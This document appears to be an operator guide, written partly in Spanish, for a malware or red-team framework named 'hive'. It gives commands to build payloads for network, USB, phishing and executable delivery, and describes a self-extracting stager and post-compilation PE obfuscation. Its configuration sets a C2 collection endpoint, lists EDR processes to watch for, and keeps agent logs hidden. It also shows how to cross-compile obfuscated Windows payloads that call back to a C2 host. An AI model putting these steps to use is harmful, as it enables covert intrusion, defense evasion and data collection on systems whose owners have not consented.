# Operator Guide

## Prerequisites

- Rust toolchain (`rustup`, `cargo`)
- OpenSSL dev libraries (`apt install libssl-dev pkg-config`)
- Python 3.10+ (for tests)
- Linux kernel 3.17+ (for `memfd_create`)

## Quick Start

```bash
# Compilar todo
cargo build --release --workspace

# Generar payloads
./scripts/deploy.sh all

# Despliegue local
./scripts/launch_colony.sh
```

## Scripts principales

| Script | Propósito |
|--------|-----------|
| `scripts/deploy.sh` | Generar payloads (4 vectores: network, usb, phishing, exe) |
| `scripts/build_payload.sh` | Stager monolítico auto-extraíble |
| `scripts/launch_colony.sh` | Despliegue local con Docker |
| `scripts/obfuscate_pe.py` | PE obfuscation post-compilación |
| `scripts/scenario.sh` | Tests de escenarios |

Ver [DEPLOYMENT.md](DEPLOYMENT.md) para documentación detallada de cada vector.

## Configuración

Editar `hive.toml`:

```toml
[c2]
url = "https://your-c2:8444/collect"
api_key = "your-secret-key"

[agents]
edr_processes = ["csfalcon", "csagent", "msmpeng", "sentinelone"]

[exploits]
safe_mode = true
operator_approved = false
```

## Monitoreo

```bash
# C2 API
curl http://localhost:8444/health

# Logs de agente (modo oculto: /tmp/hive_<agent>.log)
tail -f /tmp/hive_queen.log
```

## Kill Switch

```bash
curl -X POST http://localhost:8444/beacon \
  -H "Content-Type: application/json" \
  -d '{"action":"kill_switch"}'
```

## Cross-compile Windows

```bash
./setup_cross.sh win
cargo build --release --target x86_64-pc-windows-gnu -p queen
./scripts/deploy.sh exe --windows --obfuscate --c2-host tu-c2.com
```
